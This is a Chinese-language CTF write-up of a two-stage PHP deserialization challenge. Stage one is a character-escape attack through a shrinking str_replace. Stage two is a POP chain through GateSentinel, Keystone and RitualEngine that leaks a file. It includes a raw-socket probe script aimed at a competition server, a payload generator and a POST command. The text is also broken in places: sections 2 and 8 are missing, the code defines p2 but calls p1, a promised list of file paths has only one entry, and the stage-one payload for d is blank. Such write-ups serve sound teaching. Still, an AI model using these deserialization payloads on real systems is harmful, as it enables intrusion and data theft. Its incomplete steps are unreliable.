
## 0. 题目总体分析

本题属于非常经典的“两阶段 PHP 反序列化”考点。

观察题目主页的背景描述，其实能够提取出两条核心提示：

- “后殿则由一连串会自行苏醒的对象守卫看守”
  这部分则指向了 PHP 中的魔术方法调用链，即我们熟知的 POP 链。

   - 各种正则匹配、字符串过滤与替换机制、白名单校验

从主页我们可以直接发现两个文件路径：

- `rune_trial.php`

## 1. 步骤一：确保稳定获取页面响应

由于该题目所处端口对常规的 `curl` 请求兼容性较差，单纯使用 `GET /` 偶尔会返回空结果。
为了便于后续的稳定测试，我编写了一段精简的底层 HTTP 探测代码，利用 TCP 连接直接发送 HTTP/1.0 请求。

具体代码如下，文件保存为 [probe_http.py](D:\edu\Darkwell\Game\ISCC\region_level\WEB(1)\probe_http.py)：

```python
import argparse
import socket
import sys


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="39.105.213.28")
    parser.add_argument("--port", type=int, default=10026)
    parser.add_argument("--method", default="GET")
    parser.add_argument("--path", default="/")
    parser.add_argument("--header", action="append", default=[])
    parser.add_argument("--data", default="")
    args = parser.parse_args()

    body = args.data.encode()
    headers = [
        f"{args.method} {args.path} HTTP/1.0",
        f"Host: {args.host}:{args.port}",
        "User-Agent: probe_http.py",
        "Accept: */*",
    ]
    if body:
        headers.append(f"Content-Length: {len(body)}")
        headers.append("Content-Type: application/x-www-form-urlencoded")
    headers.extend(args.header)
    req = ("\r\n".join(headers) + "\r\n\r\n").encode() + body

    with socket.create_connection((args.host, args.port), timeout=8) as sock:
        sock.sendall(req)
        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
    sys.stdout.buffer.write(b"".join(chunks))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

其调用方式十分便捷：

```powershell
python probe_http.py --path /
python probe_http.py --path /rune_trial.php
python probe_http.py --path /mechanism_chamber.php
```

此处的重点不在于这段代码的具体实现，而在于解决问题的思维方式：

- 当常规工具表现不稳定时，应当尝试自行构造并掌控底层的请求报文。
- 在解决 Web 方向的 CTF 题目时，构建一个“稳定且易于复现”的通信手段是极为关键的基础。

## 3. 阶段一核心思路：典型的“反序列化字符逃逸”

首先分析第一阶段的核心代码逻辑：

```php
class nameA {
    public $x;
    public $y;
    
    public function __construct($a, $b) {
        $this->x = $a;
        $this->y = $b;
    }
    
    public function __wakeup() {
        if ($this->y === 'admin123') {
            include('relic_manifest.php');
            echo "成功！文件名: " . $filename;
        }
    }
}

function p2($i) { 
    $key = "bnhpjowd"; 
    $search = '';
    for ($j = 0; $j < strlen($key); $j++) {
        $search .= chr(ord($key[$j]) - 1);
    }
    $replace = 'iscc';
    return str_replace($search, $replace, $i);
}

if (isset($_GET['d']) && isset($_GET['p'])) {
    $input = $_GET['d'];
    $passwd = $_GET['p'];
    if (strpos($input, 'amgoinvc') === false) {
        die('invalid input');
    }
    $obj = new nameA($input, $passwd);
    $ser = serialize($obj);
    $result = p1($ser);
    unserialize($result);
}
```

### 3.1 业务逻辑通俗解析

服务器端主要执行了以下流程：

1. 接收用户输入的参数 `d` 与 `p`。
2. 校验参数 `d` 中是否包含特定的子串 `amgoinvc`。
3. 将这两个参数作为属性实例化 `nameA($x, $y)` 对象。
4. 对实例化后的对象执行序列化操作。
5. 针对序列化生成的字符串进行特定的字符替换。
6. 将完成替换操作后的字符串再次传入 `unserialize()`。
7. 倘若经过反序列化重构出的对象满足 `$y === 'admin123'` 条件，便会打印出通往下一阶段的关键提示。

由此可见，这一阶段的核心诉求十分清晰：

> 必须构造特定的 Payload，使得在最后一步 `unserialize()` 执行后，对象实例的 `y` 属性值被篡改为 `admin123`。

## 4. 阶段一破局点：替换导致实际长度与序列化标记脱节

### 4.1 逆向推导替换规则

审视下面这段逻辑：

```php
$key = "bnhpjowd";
for ($j = 0; $j < strlen($key); $j++) {
    $search .= chr(ord($key[$j]) - 1);
}
```

通过将每个字符的 ASCII 码递减 1，我们可以得出：

- `b -> a`
- `n -> m`
- `h -> g`
- `p -> o`
- `j -> i`
- `o -> n`
- `w -> v`
- `d -> c`

最终拼接出的 `$search` 变量值为：

```text
amgoinvc
```

紧接着执行了替换操作：

```php
str_replace('amgoinvc', 'iscc', $serialized_string)
```

这就意味着：

- 被替换的目标串长度为 8
- 替换后的目标串长度为 4

由此可知，每发生一次匹配替换，整个字符串的有效长度就会缩减 4 个字节。

---

### 4.2 漏洞成因剖析

在 PHP 的原生序列化数据结构中，字符串类型是包含长度声明的，例如：

```php
s:8:"abcdefgh";
```

此处的 `8` 即代表后续字符串的预设长度。
倘若初始内容长度为 8，随后在底层被强行替换为 4 个字符，然而数字标示 `8` 却未做同步修改，那么在进行反序列化解析时，引擎便会依据“8”这个旧标记，越界向后强行多读取 4 个字符。

这就构成了此类反序列化字符逃逸题目的根本解法：

> 当字符替换使得“实际文本缩水”时，反序列化机制依旧恪守“原始长度标记”进行截取。这必然会导致后续原本用作语法结构的字符被当作普通字符串“吃掉”，进而引发对象属性的解析错位。

## 5. 阶段一 Payload 构造起手式

### 5.1 还原初始序列化形态

已知 `nameA` 类拥有 `x` 与 `y` 两个公共成员变量，因而其标准序列化形态大致如下：

```php
O:5:"nameA":2:{
    s:1:"x";s:len1:"<d>";
    s:1:"y";s:len2:"<p>";
}
```

假若我们能够促使 `x` 属性在被反序列化解析时发生“越界吞噬”，把原本属于后方语法结构的字符消化掉，我们便能顺理成章地将原有的 `y` 属性覆盖，并注入我们自定义的恶意结构：

```php
s:1:"y";s:8:"admin123";
```

确立了这一逻辑，也就明确了本阶段的总体破解方针。

---

### 5.2 为何要在 `d` 参数上做手脚

仔细观察代码中的这处硬性校验：

```php
strpos($input, 'amgoinvc') !== false
```

这表明参数 `d` 内部绝不能缺少 `amgoinvc` 这一字符串。
基于此，顺水推舟的思路便是：利用传递给 `x` 属性的 `d` 参数来触发字符替换。

由于每匹配并替换一次 `amgoinvc` 就会缩短 4 个字节，
若我们在其中植入 4 次该字符串，整体长度便会锐减：

```text
4 * 4 = 16
```

基于这种推算，初步设定如下：

```text
d = amgoinvcamgoinvcamgoinvcamgoinvc
```

如此一来，在经过替换处理后，该段内容便会产生 16 个字节的长度落差。

---

## 6. 深入剖析：这 16 个字节究竟吃掉了什么

### 6.1 预期的逃逸效果

我们所期望达成的完美状态为：

- 变量 `x` 在序列化字符串头部标示的长度值维持原样
- 但其内部真实的字符数已缩水了 16 字节
- 这将迫使 PHP 在解析 `x` 时，不得不向后“借用” 16 个字符来凑数

只要这 16 个字节的“借用”恰好将原本用于声明 `y` 属性的语法包裹字符吞噬殆尽，我们就可以利用紧跟其后的 `p` 参数值来顶替并构造出合规的新序列化结构。

通常的做法是手搓一段用于截断的闭合代码，如：

```text
;s:1:"y";s:8:"admin123";}
```

需要思考的是：这段“恶意闭合代码”应当安插在何处？
结论是：将其作为参数 `p` 传入。

回顾一下未篡改前的报文布局：

```text
... s:1:"x";s:32:"<d内容>";s:1:"y";s:<len>:"<p内容>";
```

一旦 `x` 的读取游标被迫向后延展 16 个字节，它就会将紧挨着的一截 `;s:1:"y";s:...` 强制纳为己有。
此时，只要吞噬的边界卡得精准，残余下来的 `p` 部分便会顺理成章地被当作合法的键值对进行解析。

---

### 6.2 参数 `p` 必须以 `;s:1:"y"...` 打头的缘由

我们的终极目的是哄骗反序列化引擎，使其最终读取到的指令流变成这样：

```text
... "某个被截断后的x内容";s:1:"y";s:8:"admin123";}
```

拆解来看即是：

- 前半段充当被拉长后的 `x` 的闭合部分
- 后半截则顺势挂载我们精心捏造的 `y` 属性
- 最后使用 `}` 将整个对象实例强行终结

基于上述逻辑，我们很容易想到将参数赋为：

```text
p = ;s:1:"y";s:8:"admin123";}
```

然而，仅仅这样还不够严谨，因为解析器在遇到右大括号之前依然会核对长度，为了确保后续被废弃的脏数据不破坏语法平衡，我们通常还需塞入一定数量的垃圾字符来占位。

改良后的最终形态类似于：

```text
p = ;s:1:"y";s:8:"admin123";} + 大量填充字符
```

## 7. 解析阶段一 Payload 的生效原理

最终打通此关卡的 Payload 实体如下：

```text

p = ;s:1:"y";s:8:"admin123";}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

重点绝非机械地背诵这串字符，而在于吃透背后的运作机理：

### 7.1 参数 `d` 所扮演的角色

在 `d` 中塞入 4 组 `amgoinvc`，其唯一使命就是在经过正则替换洗礼后，精准地为 `x` 腾出 16 字节的“吞噬额度”。

### 7.2 参数 `p` 所扮演的角色

此时的 `p` 早就失去了所谓“密码”的语义，它纯粹是用来填补空缺、并借助语法错位强行“嫁接”上去的一段“虚假反序列化指令”。

### 7.3 此类题型的固定范式

日后如果在代码审计时撞见这套连招，务必保持极度敏感：

```php

str_replace(...)
unserialize(...)
```

只要确认字符替换操作会引发长度上的增减，就必然暗藏着利用反序列化长度逃逸进行攻击的绝佳跳板。

## 9. 阶段二破局思路：受限于白名单的 POP 链构造

尽管第二关给出的代码体量庞大，但在审计时切忌陷入逐行死磕的误区，首要原则是梳理出宏观的骨架。

### 9.1 锁定数据交互点

```php
if (isset($_POST['data'])) {
    $input = $_POST['data'];
    $allowed = [
        'Chronicler',
        'RuneScribe',
        'RitualEngine',
        'GateSentinel',
        'Keystone',
    ];
    $data = @unserialize($input, ['allowed_classes' => $allowed]);
}
```

通过这段逻辑可以提炼出如下关键点：

1. 用户的输入受控点位于 `$_POST['data']`。
2. 服务器端会对该参数执行 `unserialize()`。
3. 严格限制了反序列化过程中只认可数组 `$allowed` 中定义的 5 个类。

明确了上述限制后，我们的战略目标随之转换：

> 放弃寻找系统内置类的各种原生利用链（如原生类利用等），将全部精力集中在这给定的 5 个类中，挖掘并拼接出一条可行的魔术方法执行链。

## 10. 阶段二代码审计的正确姿势

处理此类带有大量类的 POP 链题目，切不可毫无头绪地通读全篇。
强烈建议遵循以下四步走策略：

1. 筛查哪些类内部声明了魔术方法
2. 辨别哪些魔术方法具备被动/自动触发的条件
3. 追踪哪些方法内部存在向外调用其他对象方法的跳板
4. 锁定最终执行了“高危操作”的终点函数

经排查，本题中最具威胁的操作潜伏在 `RitualEngine::run()` 当中：

```php
public function run($file = null) {
    $baseDir = __DIR__;
    $name = $file ?: $this->target;
    if (!$name) {
        return;
    }
    if (!preg_match('/^[A-Za-z0-9_-]+\.txt$/', $name)) {
        return;
    }
    $path = $baseDir . DIRECTORY_SEPARATOR . $name;
    $real = realpath($path);
    if ($real === false) {
        return;
    }
    if (strpos($real, $baseDir . DIRECTORY_SEPARATOR) !== 0) {
        return;
    }
    if (@is_file($real) && @filesize($real) < 2048) {
        @highlight_file($real);
    }
}
```

这段逻辑主要实现了以下功能：

- 能够拉取当前层级目录下的指定 `.txt` 文件。
- 对文件名进行了正则过滤，仅放行由字母、数字、短划线与下划线拼接的 `.txt` 后缀名称。
- 做了限制防护，杜绝了向上跨目录读取（目录穿越）的可能。
- 最终使用 `highlight_file()` 将目标文本源码回显。

这实际上等同于提供了一个“当前目录下受限的任意 txt 文件读取”接口。

联想到第一关末尾我们恰好斩获了一个规整的 `.txt` 文件名，解题路线便豁然开朗：

> 整个第二关的核心使命，就是千方百计地构建出一条能够触达 `RitualEngine::run()` 的调用链，并顺势将其内部的 `target` 属性篡改为我们在前一关拿到的文件名。

## 11. 寻找阶段二的链条触发源

### 11.1 审视 `GateSentinel::__wakeup`

```php
public function __wakeup() {
    if (preg_match("/\.\.|flag|etc/i", $this->object)) {
        $this->object = "index.html";
    }
}
```

此处埋藏着一个非常经典的触发机制：

```php
preg_match(..., $this->object)
```

在 PHP 的运行逻辑中，若传入 `preg_match` 的 `$this->object` 并非普通字符串类型，而是一个对象实例时，解释器会强制将其当作字符串来读取。这一行为将完美触发该对象中可能存在的 `__toString()` 魔术方法。

循着这条线索，我们马上开始排查：哪一个类中定义了 `__toString()`？

---

### 11.2 分析 `GateSentinel::__toString`

```php
public function __toString() {
    if (isset($this->tool['blade'])) {
        $this->tool['blade']->object;
    }
    return "GateSentinel";
}
```

这段代码看似平平无奇，却隐藏着一步至关重要的跨类调用跳板：

```php
$this->tool['blade']->object;
```

假设我们将 `tool['blade']` 实例化为一个拥有 `__get()` 方法的外部对象，那么在尝试获取其并未显式声明的 `object` 属性时，便会无缝激活该对象的 `__get()`。

紧接着进行下一步检索：谁实现了 `__get()`？

---

### 11.3 解码 `Keystone::__get`

```php
public function __get($name) {
    $processor = $this->center;

    if (!is_object($processor)) {
        return null;
    }

    $safeClasses = ['RitualEngine', 'GateSentinel', 'RuneScribe', 'Chronicler', 'Keystone'];
    if (!in_array(get_class($processor), $safeClasses, true)) {
        return null;
    }

    if (is_callable($processor)) {
        return $processor();
    }

    return null;
}
```

解析这段代码的处理逻辑：

- 变量 `center` 需保证为一个有效的对象实例
- 确保该对象的归属类在这几个受信任的名单内
- 若该对象具备被当做函数直接呼叫的能力，则触发 `$processor()`

在 PHP 中，怎样才算是一个“可被呼叫”的对象？
答案是：内置了 `__invoke()` 魔术方法的类。

顺藤摸瓜：继续定位 `__invoke()` 的所在之处。

---

### 11.4 终极执行者 `RitualEngine::__invoke`

```php
public function __invoke() {
    if (empty($this->callback)) {
        return;
    }

    $action = @unserialize($this->callback);
    
    if (!is_array($action) || count($action) !== 2) {
        return;
    }
    
    [$obj, $method] = $action;
    
    if (!($obj instanceof self)) {
        return;
    }

    if (!is_string($method)) {
        return;
    }

    $map = [
        'view' => 'run',
    ];

    if (!isset($map[$method])) {
        return;
    }

    $real = $map[$method];
    $obj->$real();
}
```

这里便是主导整个阶段二攻击链路的最末端。

其内部运作轨迹如下：

1. 读取自身的 `$this->callback` 属性
2. 对其内容执行嵌套的 `unserialize()` 操作
3. 要求反序列化生成的产物必须是一个双元素数组
4. 约束数组的首个元素必须依然是 `RitualEngine` 的实例对象
5. 限制数组的次个元素为文本字符串类型
6. 假如这第二个元素等于 `"view"`，代码会将其偷换为 `"run"`
7. 最后施展出绝杀调用：

```php
$obj->run();
```

至此，拼图的最后一块已然归位，完整的攻击链正式打通。

## 12. 梳理阶段二完整的 POP 链路

我们将前文拆解的碎片拼接起来，形成连贯的流程：

### 12.1 链路的入口点

当系统对 `$_POST['data']` 进行 `unserialize()` 操作时，若我们构造的根节点对象为 `GateSentinel`，则会毫无悬念地拉开帷幕：

```php
GateSentinel::__wakeup()
```

### 12.2 借由 `__wakeup()` 引发类型转换

在该方法内部执行了如下判断：

```php
preg_match(..., $this->object)
```

此时只要令 `object` 存放另外一个精心准备的对象，便能顺理成章地激活那个对象的：

```php
__toString()
```

### 12.3 通过 `__toString()` 制造越权取值

来到处于内部层级的 `GateSentinel::__toString()`，其中包含：

```php
$this->tool['blade']->object;
```

当 `tool['blade']` 被指向 `Keystone` 的实例时，对虚无的 `object` 成员进行强行访问，自然会敲开以下方法的大门：

```php
Keystone::__get('object')
```

### 12.4 在 `__get()` 阶段触发匿名调用

只要将 `Keystone->center` 赋值为实现了 `__invoke()` 的 `RitualEngine` 实例，接下来的这句代码：

```php
$processor();
```

便等同于直接扣动了扳机：

```php
RitualEngine::__invoke()
```

### 12.5 在 `__invoke()` 内部进行二次解包

我们提前将一段合法的序列化串赋予 `callback`，使其被解析为：

```php
[
    <某个 RitualEngine 对象>,
    "view"
]
```

得益于内部字典的转换机制，`"view"` 变相成为了 `"run"`，使得最核心的指令得以落位：

```php
<那个 RitualEngine 对象>->run();
```

### 12.6 终局：利用 `run()` 完成文件泄露

只要我们在构造时将最后这个对象的 `target` 属性精准定位于：

```text
<relic>.txt
```

目标文件的源码便会通过高亮机制直接暴露在我们面前。

## 13. 剖析阶段二中“双重 GateSentinel”套娃的必要性

这个地方往往是新手入门 POP 链构造时最爱踩坑的盲区。

### 13.1 仅依赖单层结构的死胡同

不妨回顾一下我们达成目标的必要前置条件：

1. 必须依靠最外部的对象在 `unserialize()` 结束之际自发地回调 `__wakeup()`
2. 必须依靠该 `__wakeup()` 函数内的 `preg_match()` 机制，强行去读取某个内嵌“对象”的字符串表达
3. 唯有如此操作，方能顺畅衔接至后续的 `__toString()` 节点

由此推导出的最佳实践策略便是套娃操作：

- 最外部包裹一层：`GateSentinel`
- 将外部实例的 `object` 属性：再塞入一个新的 `GateSentinel` 实例

如此构建的传导链路为：

```text
外层 GateSentinel 反序列化
-> 外层 __wakeup
-> preg_match( ..., 内层 GateSentinel对象 )
-> 内层 __toString
-> ...
```

这套打法的精妙之处在于，完美解耦了作为“导火索”的触发入口与实际承载“业务推进”的执行实体。

---

## 14. 阶段二 Payload 拓扑结构的逆向推演

在组装这类复杂结构时，最稳妥的方案是“由果溯因、自底向上”进行堆叠。

### 14.1 核心层：充当文件窃取者的 RitualEngine

我们首先需要捏造一个身处最底层的 `RitualEngine` 实体，其存在意义极度单一：

```php
$target = "<relic>.txt"
```

确保一旦系统唤醒其 `run()` 方法，它就会毫无偏颇地读取该目标。

可以简写为：

```text
RitualEngine(target="<relic>.txt")
```

---

### 14.2 倒数第二层：接管 `__invoke()` 的 RitualEngine

紧接着需要备妥第二个 `RitualEngine`。该实例本身并不参与文件读取，它的职能是在 `__invoke()` 被触发时展开 `callback` 的解析任务。

我们需要事先向其 `callback` 投喂经过序列化的特定文本，以确保其反解后呈现如下形态：

```php
[
    <上面那个真正读文件的 RitualEngine>,
    "view"
]
```

得益于内部预设的白名单转换字典，这里的 `"view"` 将平滑过渡为 `"run"`。

可以简写为：

```text
RitualEngine(callback=serialize([RitualEngine(target="<relic>.txt"), "view"]))
```

---

### 14.3 倒数第三层：中转站 Keystone

将 `Keystone` 实例内部的 `center` 属性绑定给上述负责解包回调的那个 `RitualEngine`。

这么一来，当外界强行向 `Keystone` 索要不存在的成员变量时，自然会引起连锁反应：

```php
Keystone::__get()
-> 调用 center()
-> 进入 RitualEngine::__invoke()
```

---

### 14.4 倒数第四层：内圈 GateSentinel

接着处理内圈的 `GateSentinel` 节点，赋予其以下属性：

- `object` 配置为任意无害的常规字符（例如 `safe.txt`）
- `tool['blade']` 指针关联至上一步组装好的 `Keystone`

如此这般，当内圈的 `__toString()` 被唤醒时：

```php
$this->tool['blade']->object;
```

这一行代码便会成为点燃剩余所有连环炸药的引信。

---

### 14.5 表层外壳：外圈 GateSentinel

最后，将最外围的 `GateSentinel->object` 属性直接覆盖为前一个步骤制作的“内圈 GateSentinel 实体”。

这样一来，反序列化伊始执行的最外层 `__wakeup()` 中的 `preg_match()`，就会因为需要处理正则匹配而不得不将该内圈实体强制文本化，进而激活内圈的 `__toString()`。

## 15. 通过脚本自动化生成阶段二的 Payload

考虑到这种重重嵌套的序列化报文只要人工手算极易发生偏差，在实际解题和演示中，强烈建议采取编写脚本的辅助方式。

以下为我在实战中所用到的轻量级 Payload 生成代码：

```python
def s(x):
    return f's:{len(x)}:"{x}";'

def o(cls, props):
    body = ''.join(s(k) + v for k, v in props)
    return f'O:{len(cls)}:"{cls}":{len(props)}:{{{body}}}'

def arr_assoc(items):
    body = ''.join(s(k) + v for k, v in items)
    return f'a:{len(items)}:{{{body}}}'

def arr_idx(items):
    body = ''.join(f'i:{i};{v}' for i, v in enumerate(items))
    return f'a:{len(items)}:{{{body}}}'

real_reader = o('RitualEngine', [
    ('target', s('<relic>.txt')),
])

callback_array = arr_idx([
    real_reader,
    s('view'),
])

invoker = o('RitualEngine', [
    ('callback', s(callback_array)),
])

key = o('Keystone', [
    ('center', invoker),
])

inner_gate = o('GateSentinel', [
    ('object', s('safe.txt')),
    ('tool', arr_assoc([
        ('blade', key),
    ])),
])

outer_gate = o('GateSentinel', [
    ('object', inner_gate),
])

print(outer_gate)
```

在此顺便强调一个 CTF 选手的优良习惯：

> 面对复杂的嵌套结构时，永远不要头铁去徒手捏造序列化文本。能通过脚本自动演算生成的，坚决不上手盲敲。

哪怕仅仅是因为一位数的长度计算失误，也会导致整段精心设计的 Payload 沦为一堆无用的废代码。

## 16. 阶段二的 Payload 投递方式

根据接口的准入规范：

```php
$_POST['data']
```

我们需要将上一步脚本打印出的反序列化字符串进行严谨的 URL Encode，随后使用标准的 POST 表单形式投递至服务器。

以 PowerShell 为例，具体的构造与发送命令如下：

```powershell
$body = 'data=' + [uri]::EscapeDataString('<你的序列化串>')
python probe_http.py --method POST --path /mechanism_chamber.php --data $body
```

发送无误的话，网页的回显将会忠实地呈现出目标 `.txt` 文件内埋藏的密文。
遵照约定，本篇解析中隐去了真实的 flag 字符串，但只要按照上述步骤推进至此，胜利的果实自然触手可及。
